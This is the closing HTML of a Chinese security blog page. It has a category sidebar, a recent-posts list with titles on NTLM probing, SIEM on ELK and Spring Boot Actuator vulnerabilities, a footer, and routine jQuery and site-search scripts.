		
			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
		
			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
		
			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
		
			<li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
		
			<li><a href="/categories/Python/">Python<span>5</span></a></li>
		
			<li><a href="/categories/SQL/">SQL<span>7</span></a></li>
		
			<li><a href="/categories/Tools/">Tools<span>2</span></a></li>
		
		</ul>
	</div>

		
			

		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
      </li>
    
      <li>
        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
      </li>
    
      <li>
        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
      </li>
    
      <li>
        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
      </li>
    
      <li>
        <a href="/2021/04/06/defense-from-c2.html" ><i class="fa fa-file-o"></i>防御性C2玩具尝试</a>
      </li>
    
  </ul>
</div>

		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2022 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
